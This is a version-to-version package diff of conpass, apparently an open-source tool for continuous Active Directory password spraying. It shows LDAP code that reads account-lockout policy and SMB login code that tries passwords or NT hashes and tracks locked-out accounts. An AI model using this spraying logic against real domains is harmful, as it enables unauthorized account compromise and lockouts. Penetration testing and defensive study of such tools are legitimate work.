+        attributes = [
+            'lockoutThreshold',
+            'lockOutObservationWindow'
+        ]
 
-        if 'gPLink' not in entry:
-            return []
-        res = [GPO(dn.lower(), int(options), *gpos[dn.lower()]) for dn, options in re.compile(r'\[LDAP://(cn=.*?);(\d+)]').findall(entry['gPLink'][0].decode('utf-8'))]
-
-        lockout_threshold, lockout_reset = None, None
-        for gpo in res:
-            if gpo.options & GPO.GPLINK_OPT_DISABLE:
-                continue
-            if gpo.lockout_threshold is not None:
-                lockout_threshold = gpo.lockout_threshold
-            if gpo.lockout_reset is not None:
-                lockout_reset = gpo.lockout_reset
-
-        return lockout_threshold, lockout_reset
-
-    def get_gpos_filepath(self, impacketfile, distinguished_names):
-        filters = "(&(objectClass=groupPolicyContainer))"
-        attributes = ['distinguishedName', 'gPCFileSysPath']
         res = self._conn.search_ext(
             self.domain_dn,
             ldap.SCOPE_SUBTREE,
-            filters,
+            filter,
             attributes
         )
-        rtype, rdata, rmsgid, serverctrls = self._conn.result3(res)
-        ret = {}
-        for dn, entry in rdata:
-            if isinstance(entry, dict) and 'gPCFileSysPath' in entry and dn.lower() in distinguished_names:
-                ret[dn.lower()] = GPO.get_password_policy(impacketfile, entry['gPCFileSysPath'][0].decode('utf-8'))
-        return ret
+        _, rdata, _, _ = self._conn.result3(res)
+        dn, entry = rdata[0]
+        return int(entry['lockoutThreshold'][0].decode('utf-8')), int(entry['lockOutObservationWindow'][0].decode('utf-8'))
 
-    def get_paged_users(self, filters, attributes):
+    def get_paged_objects(self, filters, attributes):
         pages = 0
         result = []
 
         page_control = SimplePagedResultsControl(True, size=self.page_size, cookie='')
         res = self._conn.search_ext(
             self.domain_dn,
             ldap.SCOPE_SUBTREE,
```

### Comparing `conpass-0.0.1/conpass/password.py` & `conpass-0.1.0/conpass/password.py`

 * *Files identical despite different names*

### Comparing `conpass-0.0.1/conpass/session.py` & `conpass-0.1.0/conpass/session.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,14 +1,11 @@
-import logging
-
-from impacket.nmb import NetBIOSError
-from impacket.smbconnection import SMBConnection, SessionError
+from impacket.smbconnection import SMBConnection
 
 from conpass.password import PASSWD_TYPE
-
+from conpass.ntlminfo import NtlmInfo
 
 class Session:
     """
     Custom impacket SMB session
     """
     def __init__(self, address, target_ip, domain, console, port=445, debug=False):
         self.console = console
@@ -18,25 +15,29 @@
         self.domain = domain
         self.port = port
         self.username = ""
         self.password = ""
         self.domain = ""
 
         self.smb_session = None
+        self.locked_out = []
 
     def get_session(self):
         try:
             self.smb_session = SMBConnection(self.address, self.target_ip, None, sess_port=self.port)
         except Exception:
             self.console.log("Coulnd't open SMB session")
             if self.debug:
                 self.console.print_exception()
             self.smb_session = None
         return self
 
+    def get_remote_time(self):
+        return NtlmInfo(self.target_ip, self.target_ip, self.port).get_server_time()
+
     def login(self, username, password):
         if self.smb_session is None:
             return False
         try:
             self.smb_session.login(username, password, self.domain)
         except Exception as e:
             if "STATUS_LOGON_FAILURE" in str(e):
@@ -56,14 +57,21 @@
         if password.get_type() == PASSWD_TYPE.NT:
             nthash = password.value
             password_value = ""
         else:
             password_value = password.value
 
         try:
+            if username in self.locked_out:
+                return False
             self.smb_session.login(username, password_value, self.domain, "", nthash)
             return True
-        except SessionError:
-            return False
         except Exception as e:
-            self.get_session()
-            self.test_credentials(username, password)
+            if 'Broken pipe' in str(e):
+                import time
+                time.sleep(0.5)
+                self.get_session()
+                self.test_credentials(username, password)
+            if 'STATUS_ACCOUNT_LOCKED_OUT' in str(e):
+                self.locked_out.append(username)
+                self.console.log(f"[yellow]DANGER: {username} LOCKED OUT (Unlock-ADAccount -Identity {username})")
+            return False
```

### Comparing `conpass-0.0.1/conpass.egg-info/PKG-INFO` & `conpass-0.1.0/conpass.egg-info/PKG-INFO`

 * *Files 11% similar despite different names*

```diff
@@ -1,37 +1,40 @@
 Metadata-Version: 2.1
 Name: conpass
-Version: 0.0.1
+Version: 0.1.0
 Summary: Continuous password spraying tool
 Home-page: https://github.com/Hackndo/conpass/
 Author: Pixis
 Author-email: hackndo@gmail.com
 License: MIT
 Classifier: Programming Language :: Python :: 3.6
 Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
 Description-Content-Type: text/markdown
 License-File: LICENSE
+Requires-Dist: python-ldap
+Requires-Dist: impacket
+Requires-Dist: rich
 
 # ConPass
 
 [![PyPI version](https://badge.fury.io/py/conpass.svg)](https://pypi.org/project/conpass)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/conpass.svg)](https://pypistats.org/packages/conpass)
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 Python tool for continuous password spraying taking into account the password policy.
 
 | Chapters                                | Description                                     |
 |-----------------------------------------|-------------------------------------------------|
 | [Warning](#warning)                     | Before using this tool, read this               |
-| [Installation](#installation)           | Lsassy installation                             |
+| [Installation](#installation)           | ConPass installation                             |
 | [Usage](#usage)                         | ConPass usage                                   |
 
 ## Warning
 
 Although I have made every effort to make sure the tool get the correct password policy, there can be some password policy settings that are not taken into account by the tool, which may lead to accounts lockout.
 
 ## Installation
```

### Comparing `conpass-0.0.1/setup.py` & `conpass-0.1.0/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -9,28 +9,29 @@
 from setuptools import setup, find_packages
 
 HERE = pathlib.Path(__file__).parent
 README = (HERE / "README.md").read_text()
 
 setup(
     name="conpass",
-    version="0.0.1",
+    version="0.1.0",
     author="Pixis",
     author_email="hackndo@gmail.com",
     description="Continuous password spraying tool",
     long_description=README,
     long_description_content_type="text/markdown",
     packages=find_packages(exclude=["assets"]),
     include_package_data=True,
     url="https://github.com/Hackndo/conpass/",
     zip_safe = True,
     license="MIT",
     install_requires=[
         'python-ldap',
-        'impacket'
+        'impacket',
+        'rich'
     ],
     python_requires='>=3.6',
     classifiers=[
         "Programming Language :: Python :: 3.6",
         "Programming Language :: Python :: 3.7",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
```

